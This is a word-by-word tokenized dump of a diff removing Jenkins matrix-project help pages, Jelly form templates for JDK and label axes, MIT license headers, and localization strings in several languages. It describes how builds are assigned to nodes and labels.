"die", "Verdr", "\u00e4", "ngung", "anderer", "Jobs", "in", "der", "Build", "-", "Warteschlange", ".", "<", "/", "div", ">", "@", "@", "-", "1", ",", "4", "+", "0", ",", "0", "@", "@", "<", "div", ">", "\u5404", "\u8a2d\u5b9a", "\u3092\u9806", "\u756a\u306b", "\u30d3\u30eb", "\u30c9\u3057", "\u307e\u3059", "\u3002\u3053", "\u308c\u306f", "\u3001(", "\u8907\u6570", "\u30b8\u30e7", "\u30d6\u304c", "\u540c\u6642", "\u306b\u30d3", "\u30eb\u30c9", "\u3055\u308c", "\u308b\u3053", "\u3068\u306b", "\u3088\u308a", ")\u4ed6", "\u306e\u30b8", "\u30e7\u30d6", "\u304c\u30d3", "\u30eb\u30c9", "\u3055\u308c", "\u306a\u3044", "\u3053\u3068", "\u3092\u9632", "\u3050\u3068", "\u3068\u3082", "\u306b\u3001", "\u30c7", "\u30fc\u30bf", "\u30d9\u30fc", "\u30b9\u306e", "\u3088\u3046", "\u306a\u5171", "\u6709\u30ea", "\u30bd\u30fc", "\u30b9\u3078", "\u306e\u30a2", "\u30af\u30bb", "\u30b9\u3092", "\u5fc5\u8981", "\u3068\u3059", "\u308b\u5834", "\u5408\u306b", "\u5f79\u306b", "\u7acb\u3061", "\u307e\u3059", "\u3002", "<", "/", "div", ">", "<", "div", ">", "\u9078", "\u7528\u672c", "\u529f\u80fd", "\u6642\uff0c", "Jenkins", "\u6703", "\u4f9d\u5e8f", "\u5efa\u7f6e", "\u5404\u7a2e", "\u4e0d\u540c", "\u7684\u8a2d", "\u5b9a\u3002", "\u5982", "\u679c\u60a8", "\u7684\u8a2d", "\u5b9a\u9700", "\u8981\u5b58", "\u53d6\u8cc7", "\u6599\u5eab", "\u9019\u985e", "\u5171\u7528", "\u8cc7\u6599", "\u6642\u5c31", "\u5f88\u597d", "\u7528\uff0c", "\u6b64\u5916", "\uff0c\u4e5f", "\u80fd\u907f", "\u514d\u6392", "\u64e0\u6389", "\u5176\u4ed6", "\u4f5c\u696d", "\u3002", "<", "/", "div", ">", "@", "@", "-", "1", ",", "33", "+", "0", ",", "0", "@", "@", "<", "!", "The", "MIT", "License", "Copyright", "(", "c", ")", "2010", ",", "InfraDNA", ",", "Inc", ".", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "THE", "SOFTWARE", ".", ">", "<", "!-", "-", "JDK", "config", "-", "->", "<", "?", "jelly", "escape", "-", "by", "-", "default", "=", "'", "true", "'", "?>", "<", "j", ":", "jelly", "xmlns", ":", "j", "=", "\"", "jelly", ":", "core", "\"", "xmlns", ":", "st", "=", "\"", "jelly", ":", "stapler", "\"", "xmlns", ":", "d", "=", "\"", "jelly", ":", "define", "\"", "xmlns", ":", "l", "=", "\"/", "lib", "/", "layout", "\"", "xmlns", ":", "t", "=", "\"/", "lib", "/", "hudson", "\"", "xmlns", ":", "f", "=", "\"/", "lib", "/", "form", "\"", "xmlns", ":", "i", "=", "\"", "jelly", ":", "fmt", "\"", "xmlns", ":", "p", "=", "\"/", "lib", "/", "hudson", "/", "project", "\"", ">", "<", "f", ":", "entry", ">", "<", "j", ":", "forEach", "var", "=", "\"", "jdk", "\"", "items", "=", "\"$", "{", "app", ".", "JDKs", "}", "\">", "<", "f", ":", "checkbox", "name", "=", "\"", "values", "\"", "json", "=", "\"$", "{", "jdk", ".", "name", "}", "\"", "checked", "=", "\"$", "{", "instance", ".", "values", ".", "contains", "(", "jdk", ".", "name", ")", "}\"", "title", "=", "\"$", "{", "jdk", ".", "name", "}", "\"", "/", ">", "<", "st", ":", "nbsp", "/", ">", "<", "/", "j", ":", "forEach", ">", "<", "/", "f", ":", "entry", ">", "<", "/", "j", ":", "jelly", ">", "@", "@", "-", "1", ",", "66", "+", "0", ",", "0", "@", "@", "<", "!", "The", "MIT", "License", "Copyright", "(", "c", ")", "2010", ",", "InfraDNA", ",", "Inc", ".", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "THE", "SOFTWARE", ".", ">", "<", "?", "jelly", "escape", "-", "by", "-", "default", "=", "'", "true", "'", "?>", "<", "j", ":", "jelly", "xmlns", ":", "j", "=", "\"", "jelly", ":", "core", "\"", "xmlns", ":", "st", "=", "\"", "jelly", ":", "stapler", "\"", "xmlns", ":", "d", "=", "\"", "jelly", ":", "define", "\"", "xmlns", ":", "l", "=", "\"/", "lib", "/", "layout", "\"", "xmlns", ":", "t", "=", "\"/", "lib", "/", "hudson", "\"", "xmlns", ":", "f", "=", "\"/", "lib", "/", "form", "\"", "xmlns", ":", "i", "=", "\"", "jelly", ":", "fmt", "\"", "xmlns", ":", "p", "=", "\"/", "lib", "/", "hudson", "/", "project", "\"", ">", "<", "f", ":", "entry", "title", "=", "\"$", "{%", "Name", "}", "\"", "field", "=", "\"", "name", "\"", ">", "<", "f", ":", "textbox", "default", "=", "\"", "label", "\"", "/", ">", "<", "/", "f", ":", "entry", ">", "<", "f", ":", "entry", "title", "=", "\"$", "{%", "Node", "/", "Label", "}", "\"", "field", "=", "\"", "labels", "\"", ">", "<", "div", "class", "=", "\"", "yahooTree", "labelAxis", "-", "tree", "\"", "style", "=", "\"", "border", ":", "1px", "solid", "gray", ";", "height", ":", "10em", ";", "overflow", ":", "auto", ";", "\"", "values", "=", "\"$", "{", "instance", ".", "valueString", "}", "\"", "/", ">", "<", "script", ">", "Behaviour", ".", "specify", "(", "\"", "DIV", ".", "labelAxis", "-", "tree", "\"", ",", "'", "LabelAxis", "'", ",", "0", ",", "function", "(", "e", ")", "{", "var", "tree", "=", "new", "YAHOO", ".", "widget", ".", "TreeView", "(", "e", ")", ";", "var", "labels", "=", "new", "YAHOO", ".", "widget", ".", "TextNode", "(", "\"$", "{%", "Labels", "}", "\",", "tree", ".", "getRoot", "(", "),", "false", ")", ";", "var", "machines", "=", "new", "YAHOO", ".", "widget", ".", "TextNode", "(", "\"$", "{%", "Individual", "nodes", "}", "\",", "tree", ".", "getRoot", "(", "),", "false", ")", ";", "var", "values", "=", "(", "e", ".", "getAttribute", "(", "\"", "values", "\"", ")", "|", "|", "\"", "\")", ".", "split", "(", "\"/", "\")", ";", "function", "has", "(", "v", ")", "{", "return", "values", ".", "include", "(", "v", ")", "?", "'", "checked", "=", "\"", "checked", "\"", "'", ":", "\"", "\";", "}", "<", "j", ":", "forEach", "var", "=", "\"", "l", "\"", "items", "=", "\"$", "{", "app", ".", "labelAtoms", "}", "\">", "new", "YAHOO", ".", "widget", ".", "HTMLNode", "(", "<", "j", ":", "out", "value", "=", "\"$", "{", "descriptor", ".", "buildLabelCheckBox", "(", "l", ",", "instance", ")", "}\"", "/>", ",", "$", "{", "l", ".", "isSelfLabel", "(", ")?", "'", "machines", "'", ":'", "labels", "'", "},", "false", ")", ";", "<", "/", "j", ":", "forEach", ">", "tree", ".", "draw", "(", ");", "<", "!", "force", "the", "rendering", "of", "HTML", ",", "so", "that", "input", "fields", "are", "there", "even", "when", "the", "form", "is", "submitted", "without", "this", "tree", "expanded", ".", "-", "->", "tree", ".", "expandAll", "(", ");", "tree", ".", "collapseAll", "(", ");", "<", "!", "cancel", "the", "event", ".", "from", "http", ":", "//", "yuilibrary", ".", "com", "/", "forum", "/", "viewtopic", ".", "php", "?", "f", "=", "89", "&", "t", "=", "8209", "&", "p", "=", "26239", "&", "hilit", "=", "HTMLNode", "#", "p26239", "\"", "To", "prevent", "toggling", "and", "allow", "the", "link", "to", "work", ",", "add", "a", "listener", "to", "the", "clickEvent", "on", "that", "tree", "and", "simply", "return", "false", "\"", "-", "->", "tree", ".", "subscribe", "(", "\"", "clickEvent", "\"", ",", "function", "(", "node", ")", "{", "return", "false", ";", "}", ");", "}", ");", "<", "/", "script", ">", "<", "/", "f", ":", "entry", ">", "<", "/", "j", ":", "jelly", ">", "@", "@", "-", "1", ",", "26", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "Kohsuke", "Kawaguchi", ".", "Knud", "Poulsen", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Node", "/", "Label", "=", "Node", "/", "Etiket", "Labels", "=", "Etiketter", "Individual", "\\", "nodes", "=", "Individuelle", "noder", "Name", "=", "Navn", "@", "@", "-", "1", ",", "26", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", ",", "Kohsuke", "Kawaguchi", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "and", "a", "number", "of", "other", "of", "contributers", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Node", "/", "Label", "=", "Knoten", "/", "Label", "Labels", "=", "Labels", "Individual", "\\", "nodes", "=", "Einzelne", "Knoten", "Name", "=", "Name", "@", "@", "-", "1", ",", "26", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", ",", "Kohsuke", "Kawaguchi", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "and", "a", "number", "of", "other", "of", "contributers", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Node", "/", "Label", "=", "Nodo", "/", "Etiqueta", "Labels", "=", "Etiquetas", "Individual", "\\", "nodes", "=", "Nodos", "individuales", "Name", "=", "Nombre", "@", "@", "-", "1", ",", "26", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Seiji", "Sogabe", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Name", "=", "\\", "u540d", "\\", "u524d", "Node", "/", "Label", "=", "\\", "u30ce", "\\", "u30fc", "\\", "u30c9", "/", "\\", "u30e9", "\\", "u30d9", "\\", "u30eb", "Labels", "=", "\\", "u30e9", "\\", "u30d9", "\\", "u30eb", "Individual", "\\", "nodes", "=", "\\", "u500b", "\\", "u5225", "\\", "u306e", "\\", "u30ce", "\\", "u30fc", "\\", "u30c9", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", ",", "Kohsuke", "Kawaguchi", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "and", "a", "number", "of", "other", "of", "contributers", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Node", "/", "Label", "=", "N", "\\", "u00f3", "Labels", "=", "Label", "Individual", "\\", "nodes", "=", "N", "\\", "u00f3s", "individuais", "Name", "=", "Nome", "@", "@", "-", "1", ",", "26", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2013", ",", "Chunghwa", "Telecom", "Co", ".", ",", "Ltd", ".", ",", "Pei", "-", "Tang", "Huang", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Name", "=", "\\", "u540d", "\\", "u7a31", "Node", "/", "Label", "=", "\\", "u7bc0", "\\", "u9ede", "/", "\\", "u6a19", "\\", "u7c64", "Labels", "=", "\\", "u6a19", "\\", "u7c64", "Individual", "\\", "nodes", "=", "\\", "u7368", "\\", "u7acb", "\\", "u7bc0", "\\", "u9ede", "@", "@", "-", "1", ",", "27", "+", "0", ",", "0", "@", "@", "<", "div", ">", "Specify", "nodes", "where", "builds", "are", "performed", ".", "<", "ul", ">", "<", "li", ">", "If", "none", "is", "selected", ",", "Jenkins", "will", "choose", "an", "available", "node", "to", "perform", "a", "build", "(", "this", "is", "the", "same", "behavior", "as", "the", "free", "-", "style", "project", "when", "\"", "tie", "this", "project", "to", "node", "\"", "is", "not", "selected", ")", ".", "This", "is", "useful", "when", "the", "project", "doesn", "'", "t", "have", "a", "dependency", "on", "any", "particular", "node", ",", "as", "it", "allows", "Jenkins", "to", "utilize", "nodes", "in", "an", "optimal", "fashion", ".", "<", "li", ">", "If", "one", "is", "selected", ",", "Jenkins", "will", "always", "run", "the", "build", "on", "the", "specified", "node", "(", "if", "you", "select", "one", "from", "\"", "individual", "nodes", "\"", ")", "or", "one", "of", "the", "nodes", "that", "belongs", "to", "the", "label", "(", "if", "you", "select", "one", "from", "\"", "labels", "\"", ").", "This", "is", "useful", "when", "the", "build", "is", "required", "to", "run", "on", "a", "specific", "computer", ",", "or", "a", "subset", "of", "computers", ".", "For", "example", ",", "maybe", "your", "build", "requires", "MacOS", "X", ".", "<", "li", ">", "If", "multiple", "values", "are", "selected", ",", "the", "configuration", "matrix", "will", "be", "expanded", "to", "include", "all", "of", "them", ",", "and", "builds", "will", "be", "performed", "on", "all", "of", "the", "selected", "nodes", "/", "labels", ".", "This", "is", "useful", ",", "for", "example", ",", "when", "you", "'", "d", "like", "to", "run", "tests", "on", "Windows", ",", "Linux", ",", "and", "Solaris", ".", "<", "/", "ul", ">", "<", "br", ">", "During", "a", "build", ",", "the", "selected", "node", "name", "/", "label", "name", "for", "the", "given", "run", "is", "available", "as", "the", "\"", "label", "\"", "axis", ".", "See", "the", "help", "of", "\"", "axes", "\"", "below", "for", "more", "information", "about", "how", "to", "access", "the", "axis", "value", ".", "<", "/", "div", ">", "@", "@", "-", "1", ",", "30", "+", "0", ",", "0", "@", "@", "<", "div", ">", "Geben", "Sie", "die", "Knoten", "an", ",", "auf", "denen", "Ihre", "Builds", "ausgef", "\u00fc", "hrt", "werden", "sollen", ".", "<", "ul", ">", "<", "li", ">", "Ist", "kein", "Knoten", "ausgew", "\u00e4", "hlt", ",", "wird", "Jenkins", "einen", "verf", "\u00fc", "gbaren", "Knoten", "ausw", "\u00e4", "hlen", ",", "um", "den", "Build", "durchzuf", "\u00fc", "hren", "(", "dies", "ist", "das", "gleiche", "Verhalten", "wie", "beim", "\"", "Free", "-", "Style", "-", "Projekt", "\"", ",", "wenn", "\"", "Projekt", "an", "Knoten", "binden", "\"", "abgew", "\u00e4", "hlt", "ist", ")", ".", "Dies", "ist", "sinnvoll", ",", "wenn", "das", "Projekt", "keine", "Abh", "\u00e4", "ngigkeiten", "zu", "einem", "bestimmten", "Knoten", "aufweist", ",", "da", "es", "Jenkins", "erlaubt", ",", "die", "Knoten", "optimal", "einzusetzen", ".", "<", "li", ">", "Ist", "ein", "Knoten", "ausgew", "\u00e4", "hlt", ",", "wird", "Jenkins", "den", "Build", "immer", "auf", "dem", "gew", "\u00e4", "hlten", "Knoten", "(", "wenn", "ein", "Knoten", "unter", "\"", "Bestimmte", "Knoten", "\"", "ausgew", "\u00e4", "hlt", "wurde", ")", "oder", "auf", "einem", "Knoten", ",", "der", "zum", "gew", "\u00e4", "hlten", "Label", "geh", "\u00f6", "rt", "(", "wenn", "ein", "Knoten", "unter", "\"", "Labels", "\"", "ausgew", "\u00e4", "hlt", "wurde", ")", ",", "ausf", "\u00fc", "hren", ".", "Dies", "ist", "sinnvoll", ",", "wenn", "der", "Build", "auf", "einem", "bestimmten", "Rechner", "oder", "Rechnergruppe", "ausgef", "\u00fc", "hrt", "werden", "soll", ".", "Beispielsweise", "k", "\u00f6", "nnte", "der", "Build", "ein", "bestimmtes", "Betriebssystem", "wie", "MacOS", "X", "voraussetzen", ".", "<", "li", ">", "Sind", "mehrere", "Knoten", "ausgew", "\u00e4", "hlt", ",", "wird", "die", "Konfigurationsmatrix", "so", "erweitert", ",", "dass", "sie", "alle", "Werte", "beinhaltet", ".", "Builds", "werden", "dann", "auf", "allen", "gew", "\u00e4", "hlten", "Knoten", "/", "Labels", "ausgef", "\u00fc", "hrt", ".", "Dies", "ist", "sinnvoll", ",", "wenn", "Sie", "beispielsweise", "Tests", "unter", "Windows", ",", "Linux", "und", "Solaris", "ausf", "\u00fc", "hren", "m", "\u00f6", "chten", ".", "<", "/", "ul", ">", "<", "br", ">", "W", "\u00e4", "hrend", "eines", "Builds", "ist", "der", "aktuelle", "Name", "des", "Knotens", "bzw", ".", "des", "Labels", "als", "Achse", "<", "tt", ">", "label", "<", "/", "tt", ">", "sichtbar", ".", "Im", "Hilfetext", 